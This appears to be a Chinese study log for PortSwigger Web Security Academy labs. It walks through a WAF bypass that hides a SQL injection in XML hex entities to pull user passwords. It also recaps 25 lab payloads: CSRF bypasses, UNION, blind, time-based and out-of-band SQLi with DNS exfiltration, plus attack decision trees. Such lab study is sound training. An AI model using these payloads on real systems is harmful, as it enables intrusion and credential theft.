# Day 7 · WAF/XML 编码绕过与全局复盘（3 h）

> 目标：打完最后一个 lab（WAF + XML 实体编码），然后把 7 天 25 个 lab 收成一张能带走的表。
> 今天的主题其实是"**同一段 SQL，换个编码方式就能过 WAF**"——防御方的文本匹配 vs 解析器的语义还原，两者永远有缝隙。

## 时间轴

| 时段 | 内容 | 产出 |
|------|------|------|
| 00:00–00:20 | 观察 XML 请求体与 WAF 行为 | 确认拦截规则 |
| 00:20–00:50 | Hackvertor `hex_entities` 打穿 | 密码到手 |
| 00:50–01:10 | 手工验证编码原理 | 一份"实体编码"样例 |
| 01:10–02:10 | 25 个 lab 的 bypass 总表 | 一张矩阵 |
| 02:10–02:40 | 时间统计 + 能力自评 | 差距清单 |
| 02:40–03:00 | 下一步学习路线 | 三个月计划 |

---

## Lab 25 · SQL injection with filter bypass via XML encoding（Practitioner / 60 min）

### 一句话
WAF 只看原始文本里的 `SELECT`/`UNION`；把 payload 写成 XML 数字实体 `&#x53;ELECT`，WAF 看不见，XML 解析器却会还原成 `SELECT`。

### 观察
商品页 → **Check stock** → 抓包：

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockId>1</stockId>
```

改 `<stockId>1'</stockId>` → 500，说明这里拼进了 SQL（字符串或数字上下文）。
改 `<stockId>1 UNION SELECT NULL</stockId>` → **403 / 被拦**，说明有 WAF 在做关键词匹配（`UNION`、`SELECT`）。

> 标签名以你实际抓到的为准（不同版本可能是 `<storeId>`）；技术不依赖标签名。

### 攻击

**Step 1：装 Hackvertor**（BApp Store → Hackvertor → Install）。

**Step 2：** 在 Burp Repeater 里选中 `<stockId>` 的值，右键 → **Extensions → Hackvertor → Encode → hex_entities**，包成：

```xml
<stockId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></stockId>
```

**Step 3：** 发包。Hackvertor 会在请求发出前把内容替换成数字字符引用，实际线上流量是：

```xml
<stockId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;...</stockId>
```

**Step 4：** WAF 看到的是 `&#x31;&#x20;...`，没有 `SELECT` 字样 → 放行。后端 XML 解析器把实体还原成 `1 UNION SELECT username || '~' || password FROM users` → 拼进 SQL → 响应里返回 `administrator~<密码>`。

**Step 5：** 拿密码登录 → Solved。

### 为什么有效
这是"**检查点**和**使用点**对同一份数据的解析方式不一致"的经典案例：

```
WAF 读原始字节  → 看到 &#x53;ELECT，不是 SELECT，放行
XML 解析器读   → 把 &#x53; 还原成 S，得到 SELECT，交给数据库
```

数字字符引用（`&#xHH;` / `&#DDD;`）是 XML 规范的一部分，解析器**必须**还原；而 WAF 通常只做朴素的正则/子串匹配。同样的思路还能用：实体名（`&lt;`）、CDATA、UTF-16 编码、Base64（如果后端会解）。

### 手工验证（不做也行，但做了理解更深）
把 `<stockId>1&#x20;UNION&#x20;SELECT&#x20;NULL</stockId>` 手工发一次，如果也放行，说明 WAF 只匹配明文关键词，实体编码就是稳定绕过。

### 坑
- **Hackvertor 编码的是"选中区域"**，别把 `<stockId>` 标签一起选进去，否则标签也变成实体，XML 结构坏掉。
- 列数：本 lab 的 stock 查询只有 1 列可回显，所以 `1 UNION SELECT <拼接串>` 就够了；如果报列数不匹配，先 `1 UNION SELECT NULL` 试探。
- `||` 在 Oracle/PostgreSQL 可用；MySQL 要换 `CONCAT()`——但 `CONCAT` 本身也可能被 WAF 拦，那就再 hex 一次。
- 别用 URL 编码代替：请求体是 XML，URL 编码不参与 XML 解析，还原不了。

### 带走
**遇到 WAF，先问"后端用什么解析器"**。JSON、XML、multipart、GraphQL 各有各的编码层；能在"解析器会还原、WAF 不会还原"的缝隙里做文章，比硬刚关键词变形（`SeLeCt`、`/**/`）稳定得多。

---

## 全局复盘

### 一、25 个 lab 一页纸

| # | Lab | 核心手法 | 记忆点 |
|---|-----|----------|--------|
| 1 | CSRF no defenses | 直接构造 POST | 默认是零防护 |
| 2 | token 校验依赖方法 | 改 GET | `@GetMapping` 漏校验 |
| 3 | token 校验依赖存在性 | 删整个参数 | 空值 ≠ 缺失 |
| 4 | token 不绑 session | 用攻击者 token | 全局池 |
| 5 | token 绑非 session cookie | CRLF 写 `csrfKey` | `SameSite=None` 必带 |
| 6 | token 双提交 | CRLF 写 `csrf` + 自造值 | 假设"写不进 cookie" |
| 7 | Referer 依赖存在性 | `no-referrer` | 缺失即放行 |
| 8 | Referer 子串匹配 | `pushState` 改 URL + `unsafe-url` | `contains` 必翻车 |
| 9 | 隐藏数据 | `' OR 1=1--` | 注释掉 `released=1` |
| 10 | 登录绕过 | `administrator'--` | 注释掉密码判断 |
| 11 | Oracle 版本 | `v$version` | 必须 `FROM` |
| 12 | MySQL/MSSQL 版本 | `@@version` | `#` vs `--` |
| 13 | 数列数 | `ORDER BY n` 到报错 | 不用管类型 |
| 14 | 找字符列 | `'a'` 逐列换 | 有回显才有输出口 |
| 15 | 非 Oracle 枚举 | `information_schema` | 表→列→数据 |
| 16 | Oracle 枚举 | `all_tables` / `all_tab_columns` | 标识符大写 |
| 17 | 跨表取数 | `UNION SELECT username,password FROM users` | 有回显就直取 |
| 18 | 单列多值 | `\|\|'~'\|\|` / `CONCAT` | 分隔符防歧义 |
| 19 | 布尔盲注 | `SUBSTRING(...)=c` | Welcome back 有无 |
| 20 | 条件错误盲注 | `CASE WHEN ... THEN TO_CHAR(1/0)` | 500 当比特 |
| 21 | 时间盲注 | `';SELECT pg_sleep(10)--` | 同步查询 |
| 22 | 时间盲注取数 | `CASE ... pg_sleep(5)` | Intruder 看耗时 |
| 23 | OOB 交互 | `EXTRACTVALUE(xmltype(...ENTITY...))` | 用 SQLi 打 XXE |
| 24 | OOB 外带 | 密码拼进子域 | DNS 当信道 |
| 25 | XML 编码绕 WAF | `hex_entities` | 检查点≠使用点 |

### 二、两张决策树（真实目标照着走）

**CSRF：**
```
有 token？
├─ 没有 → 改方法 / 删参数试一遍 → 直接构造
└─ 有 token
   ├─ 我的 token 能打别人？ → 未绑 session
   ├─ token 绑在另一个 cookie？ → 有写 cookie 入口就打通
   ├─ cookie == body？ → 双提交，自造值
   └─ 只校验 Referer？
      ├─ 缺失就放行 → no-referrer
      └─ 子串匹配 → unsafe-url + 域名进 query
```

**SQLi：**
```
有回显？
├─ 有 → ORDER BY 数列 → UNION → 元数据枚举 → 取数
└─ 无
   ├─ 内容随布尔变化 → SUBSTRING 盲注
   ├─ 报错随布尔变化 → CASE + 1/0
   ├─ 耗时随布尔变化 → CASE + pg_sleep/SLEEP/WAITFOR
   └─ 全都没有 → OOB（Collaborator / interactsh）
```

### 三、时间统计

| 项目 | 计划 | 实际感受 |
|------|------|----------|
| CSRF 8 个 | 5.3 h | Day 1 提前 20 min 结束；Day 2 的 Lab 5 超时 15 min |
| SQLi 17 个 | 13 h | Day 4、Day 5 各超时 20–30 min |
| 复盘/笔记 | 2.5 h | 值得，第 7 天全靠它 |
| 合计 | 21 h | 约 22.5 h（超 7%） |

**超时集中在三处**（下次直接跳过这些坑）：
1. Oracle 表名大小写（Lab 16）——浪费 20 min。
2. `SameSite=None`（Lab 5）——cookie 注入了但浏览器不回传，浪费 15 min。
3. OOB payload 的 URL 编码（Lab 23）——明文塞进 cookie 直接 400，浪费 15 min。

### 四、能力自评（1–5）

| 能力 | 自评 | 依据 |
|------|------|------|
| 识别 CSRF 防护写法 | 4 | 8 种 bypass 能默写 |
| 手写 CSRF PoC | 5 | 不依赖 Pro，纯手写 |
| SQLi 注入点定位 | 4 | `'` → 恢复 → 布尔 三连 |
| UNION 利用 | 5 | 列数/类型/拼接都熟 |
| 盲注与自动化 | 3 | Intruder 会配，脚本化不熟 |
| OAST | 3 | 会打 lab，真实出网环境经验不足 |
| 编码绕过 | 3 | 会 XML 实体，其它编码层没系统练 |

### 五、下一步（三个月计划）

1. **补自动化**：用 Python `requests` 重写 Lab 19/22 的提取器（多线程 + 二分查找，把 36 次/字符压到 6 次）。再学 `sqlmap --tamper`，理解 tamper 脚本在做什么——本质就是今天 Lab 25 的手工版。
2. **扩主题**：按同样 3 h/天节奏推进 XSS（反射/存储/DOM）、SSRF、XXE、Access control、Authentication。**XXE 和今天的 Lab 23/24 直接相关**，趁热打。
3. **打真实靶场**：HackTheBox / TryHackMe 的 web 路径，把"读报错 → 定 DBMS → 选信号"变成条件反射。
4. **写报告**：把每个 lab 改写成"发现—验证—影响—修复"四段式，这是 BSCP 和真实工作的交付物形态。
5. **防御视角**：把 25 个 lab 的修复方案各写一句（参数化查询、CSRF token 绑定 session + SameSite、WAF 不能只做文本匹配）。**能修，才算真懂。**

### 六、最后一句

这 7 天真正学到的不是 25 个 payload，而是两个判断：

- **CSRF 的战场在"服务端校验分支"**：方法、参数存在性、token 归属、cookie 归属、Referer 判定——每一层都可能写错一行。
- **SQLi 的战场在"观测通道"**：回显、布尔、报错、时间、出网，五条通道总有一条通；找到通道，数据只是搬运问题。

payload 会过时，这两句话不会。
